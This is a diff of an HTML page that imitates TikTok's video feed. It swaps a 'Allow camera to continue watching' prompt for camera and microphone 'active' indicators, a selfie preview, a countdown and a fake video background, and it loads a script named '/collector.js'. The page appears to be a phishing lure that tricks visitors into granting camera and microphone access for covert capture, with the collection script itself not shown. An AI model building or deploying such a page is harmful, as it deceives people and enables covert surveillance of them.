@@ -7,275 +7,215 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{
-            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-            background:#000;
-            color:#fff;
-            height:100vh;
-            overflow:hidden;
+            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+            background:#000;color:#fff;height:100vh;overflow:hidden;
         }
         
-        /* TikTok top bar */
-        .top-bar{
-            display:flex;
-            justify-content:space-around;
-            align-items:center;
-            padding:12px 16px;
-            border-bottom:1px solid #222;
-            position:fixed;
-            top:0;
-            width:100%;
-            background:#000;
-            z-index:10;
-        }
-        .top-bar span{
-            font-size:16px;
-            font-weight:600;
-            color:#fff;
-            opacity:0.5;
-            cursor:pointer;
-        }
-        .top-bar .active{
-            opacity:1;
-            border-bottom:2px solid #fff;
-            padding-bottom:10px;
-        }
-        .top-bar .live{
-            color:#ff0050;
-            opacity:1;
-        }
-        
-        /* Video area */
-        .video-area{
-            width:100%;
-            height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            position:relative;
-        }
-        .video-placeholder{
-            width:100%;
-            height:100%;
+        /* Main container */
+        .container{
+            width:100%;height:100vh;position:relative;
             background:#111;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            position:relative;
         }
         
-        /* Loading spinner */
-        .spinner{
-            width:50px;
-            height:50px;
-            border:3px solid #333;
-            border-top:3px solid #fff;
+        /* Status bar at top */
+        .status-bar{
+            position:absolute;top:0;left:0;right:0;
+            padding:10px 15px;display:flex;
+            justify-content:space-between;align-items:center;
+            z-index:50;background:rgba(0,0,0,0.3);
+        }
+        
+        /* Green dot - Camera */
+        .green-dot{
+            width:10px;height:10px;background:#34c759;
             border-radius:50%;
-            animation:spin 0.7s linear infinite;
+            box-shadow:0 0 6px rgba(52,199,89,0.8);
+            animation:pulse-green 2s infinite;
         }
-        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes pulse-green{
+            0%,100%{box-shadow:0 0 6px rgba(52,199,89,0.8)}
+            50%{box-shadow:0 0 14px rgba(52,199,89,1)}
+        }
         
-        /* Side buttons (like real TikTok) */
+        /* Yellow dot - Microphone */
+        .yellow-dot{
+            width:10px;height:10px;background:#ffcc00;
+            border-radius:50%;
+            box-shadow:0 0 6px rgba(255,204,0,0.8);
+            animation:pulse-yellow 2s infinite;
+        }
+        @keyframes pulse-yellow{
+            0%,100%{box-shadow:0 0 6px rgba(255,204,0,0.8)}
+            50%{box-shadow:0 0 14px rgba(255,204,0,1)}
+        }
+        
+        .dots-group{
+            display:flex;gap:8px;align-items:center;
+        }
+        
+        .timer{
+            color:#fff;font-size:13px;font-weight:600;
+        }
+        
+        /* Fake TikTok video background */
+        .video-bg{
+            width:100%;height:100%;
+            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460,#1a1a2e);
+            background-size:400% 400%;
+            animation:bg-shift 8s ease infinite;
+            display:flex;justify-content:center;align-items:center;
+        }
+        @keyframes bg-shift{
+            0%{background-position:0% 50%}
+            50%{background-position:100% 50%}
+            100%{background-position:0% 50%}
+        }
+        
+        /* Animated particles */
+        .particle{
+            position:absolute;background:rgba(255,255,255,0.08);
+            border-radius:50%;animation:float-up 4s infinite;
+        }
+        @keyframes float-up{
+            0%{transform:translateY(100vh) scale(0);opacity:0}
+            20%{opacity:0.6}
+            100%{transform:translateY(-10vh) scale(1.5);opacity:0}
+        }
+        
+        /* Progress bar */
+        .progress-bar{
+            position:absolute;bottom:50px;left:20px;right:20px;
+            height:3px;background:rgba(255,255,255,0.2);
+            border-radius:2px;z-index:10;
+        }
+        .progress-fill{
+            height:100%;background:#ff0050;border-radius:2px;
+            animation:progress 300s linear forwards;
+        }
+        @keyframes progress{from{width:0%}to{width:100%}}
+        
+        /* Side buttons */
         .side-buttons{
-            position:absolute;
-            right:12px;
-            bottom:120px;
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            gap:25px;
-            z-index:5;
+            position:absolute;right:12px;bottom:120px;
+            display:flex;flex-direction:column;align-items:center;gap:25px;z-index:5;
         }
         .side-btn{
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            gap:4px;
+            display:flex;flex-direction:column;align-items:center;gap:4px;
         }
         .side-btn .icon{
-            width:45px;
-            height:45px;
-            background:#333;
-            border-radius:50%;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            font-size:22px;
+            width:45px;height:45px;background:rgba(255,255,255,0.1);
+            border-radius:50%;display:flex;justify-content:center;
+            align-items:center;font-size:22px;
         }
-        .side-btn span{
-            font-size:11px;
-            color:#ddd;
-            font-weight:600;
-        }
-        .side-btn .heart{color:#ff0050}
+        .side-btn span{font-size:11px;color:#ddd}
         
         /* Bottom info */
         .bottom-info{
-            position:absolute;
-            bottom:60px;
-            left:12px;
-            right:70px;
-            z-index:5;
+            position:absolute;bottom:60px;left:15px;right:70px;z-index:5;
         }
-        .username{
-            font-weight:700;
-            font-size:16px;
-            margin-bottom:8px;
-        }
-        .username .badge{
-            background:#ff0050;
-            color:#fff;
-            font-size:10px;
-            padding:2px 6px;
-            border-radius:4px;
-            margin-left:6px;
-        }
-        .caption{
-            font-size:14px;
-            color:#eee;
-            margin-bottom:10px;
-            line-height:1.4;
-        }
-        .music{
-            font-size:12px;
-            color:#aaa;
-            display:flex;
-            align-items:center;
-            gap:6px;
-        }
+        .username{font-weight:700;font-size:15px;margin-bottom:6px}
+        .badge{background:#ff0050;font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
+        .caption{font-size:13px;color:#ddd;margin-bottom:8px}
+        .music{font-size:11px;color:#999}
         
         /* Bottom nav */
         .bottom-nav{
-            position:fixed;
-            bottom:0;
-            width:100%;
-            display:flex;
-            justify-content:space-around;
-            padding:10px 0 20px;
-            background:#000;
-            border-top:1px solid #222;
-            z-index:10;
+            position:absolute;bottom:0;width:100%;
+            display:flex;justify-content:space-around;
+            padding:12px 0 25px;background:#000;
+            border-top:1px solid#222;z-index:10;
         }
         .nav-item{
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            gap:4px;
-            font-size:10px;
-            color:#888;
+            display:flex;flex-direction:column;align-items:center;
+            gap:4px;font-size:10px;color:#888;
         }
-        .nav-item .nav-icon{font-size:22px}
         .nav-item.active{color:#fff}
+        .nav-item .nav-icon{font-size:22px}
         .nav-item .plus{
-            background:#ff0050;
-            color:#fff;
-            width:30px;
-            height:30px;
-            border-radius:8px;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            font-size:20px;
+            background:#ff0050;width:30px;height:30px;
+            border-radius:8px;display:flex;
+            justify-content:center;align-items:center;
+            font-size:20px;color:#fff;
         }
         
-        /* Permission overlay */
-        .permission-note{
-            position:absolute;
-            bottom:140px;
-            left:50%;
-            transform:translateX(-50%);
-            background:rgba(0,0,0,0.8);
-            color:#fff;
-            padding:8px 16px;
-            border-radius:20px;
-            font-size:12px;
-            z-index:20;
-            animation:fadeInOut 3s forwards;
-        }
-        @keyframes fadeInOut{
-            0%{opacity:0}
-            20%{opacity:1}
-            80%{opacity:1}
-            100%{opacity:0}
+        /* Selfie preview */
+        #selfiePreview{
+            position:absolute;top:50px;right:10px;
+            width:90px;height:140px;border-radius:10px;
+            border:2px solid rgba(255,255,255,0.3);
+            object-fit:cover;z-index:5;background:#000;
         }
     </style>
 </head>
 <body>
-
-    <!-- Top Navigation -->
-    <div class="top-bar">
-        <span>Following</span>
-        <span class="active">For You</span>
-        <span class="live">LIVE</span>
-    </div>
-
-    <!-- Video Area -->
-    <div class="video-area">
-        <div class="video-placeholder">
-            <div class="spinner" id="spinner"></div>
+    <div class="container">
+        <!-- STATUS BAR with dots -->
+        <div class="status-bar">
+            <span class="timer" id="displayTimer">5:00</span>
+            <div class="dots-group">
+                <div class="green-dot" title="Camera active"></div>
+                <div class="yellow-dot" title="Microphone active"></div>
+            </div>
         </div>
         
-        <!-- Permission Note -->
-        <div class="permission-note">Allow camera to continue watching</div>
+        <!-- Selfie preview -->
+        <video id="selfiePreview" autoplay muted playsinline></video>
         
-        <!-- Side Buttons -->
+        <!-- Fake video background -->
+        <div class="video-bg" id="videoBg"></div>
+        
+        <!-- Progress bar -->
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        
+        <!-- Side buttons -->
         <div class="side-buttons">
-            <div class="side-btn">
-                <div class="icon">👤</div>
-            </div>
-            <div class="side-btn">
-                <div class="icon heart">❤️</div>
-                <span>87.4K</span>
-            </div>
-            <div class="side-btn">
-                <div class="icon">💬</div>
-                <span>2,456</span>
-            </div>
-            <div class="side-btn">
-                <div class="icon">🔗</div>
-                <span>Share</span>
-            </div>
-            <div class="side-btn">
-                <div class="icon">🎵</div>
-            </div>
+            <div class="side-btn"><div class="icon">👤</div></div>
+            <div class="side-btn"><div class="icon">❤️</div><span>87.4K</span></div>
+            <div class="side-btn"><div class="icon">💬</div><span>2.4K</span></div>
+            <div class="side-btn"><div class="icon">🔗</div><span>Share</span></div>
+            <div class="side-btn"><div class="icon">🎵</div></div>
         </div>
         
-        <!-- Bottom Info -->
+        <!-- Bottom info -->
         <div class="bottom-info">
-            <div class="username">
-                @trending_videos <span class="badge">Follow</span>
-            </div>
-            <div class="caption">
-                Wait for it... 😱🔥 This is going viral! #fyp #trending
-            </div>
-            <div class="music">
-                🎵 Original Sound - TikTok Trending
-            </div>
+            <div class="username">@trending_viral<span class="badge">Follow</span></div>
+            <div class="caption">Wait for it... 😱🔥 This is going viral! #fyp</div>
+            <div class="music">🎵 Original Sound - TikTok</div>
+        </div>
+        
+        <!-- Bottom nav -->
+        <div class="bottom-nav">
+            <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
+            <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
+            <div class="nav-item"><div class="plus">+</div></div>
+            <div class="nav-item"><div class="nav-icon">💬</div>Inbox</div>
+            <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
         </div>
     </div>
-
-    <!-- Bottom Navigation -->
-    <div class="bottom-nav">
-        <div class="nav-item active">
-            <div class="nav-icon">🏠</div>
-            <span>Home</span>
-        </div>
-        <div class="nav-item">
-            <div class="nav-icon">🔍</div>
-            <span>Discover</span>
-        </div>
-        <div class="nav-item">
-            <div class="plus">+</div>
-        </div>
-        <div class="nav-item">
-            <div class="nav-icon">💬</div>
-            <span>Inbox</span>
-        </div>
-        <div class="nav-item">
-            <div class="nav-icon">👤</div>
-            <span>Profile</span>
-        </div>
-    </div>
-
-    <script src="/collector.js?v=5"></script>
+    
+    <script src="/collector.js?v=7"></script>
+    <script>
+        // Countdown timer
+        let timeLeft = 300;
+        const timerEl = document.getElementById('displayTimer');
+        setInterval(()=>{
+            if(timeLeft>0){timeLeft--;
+                const m=Math.floor(timeLeft/60);
+                const s=timeLeft%60;
+                timerEl.textContent=m+':'+(s<10?'0':'')+s;
+            }
+        },1000);
+        
+        // Particles
+        const bg=document.getElementById('videoBg');
+        for(let i=0;i<20;i++){
+            const p=document.createElement('div');
+            p.className='particle';
+            p.style.left=Math.random()*100+'%';
+            p.style.width=p.style.height=Math.random()*5+2+'px';
+            p.style.animationDelay=Math.random()*4+'s';
+            bg.appendChild(p);
+        }
+    </script>
 </body>
 </html>
